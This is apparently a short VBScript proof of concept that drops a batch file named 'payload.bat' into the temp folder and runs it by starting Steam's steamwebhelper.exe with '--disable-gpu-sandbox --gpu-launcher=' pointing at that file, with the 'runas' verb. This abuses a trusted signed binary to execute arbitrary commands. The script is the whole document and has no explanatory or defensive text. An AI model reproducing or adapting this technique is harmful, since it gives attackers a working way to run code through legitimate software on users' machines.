Set FSO = CreateObject("Scripting.FileSystemObject")
Set Shell = CreateObject("WScript.Shell")
Set App = CreateObject("Shell.Application")

Temp = Shell.expandEnvironmentStrings("%temp%") + "\payload.bat"
Payload = "echo :) && cmd"

Set File = FSO.CreateTextFile(Temp, true)
File.WriteLine(Payload)

App.ShellExecute "C:\Program Files (x86)\Steam\bin\cef\cef.win7x64\steamwebhelper.exe", "--disable-gpu-sandbox --gpu-launcher=" + Temp, , "runas"
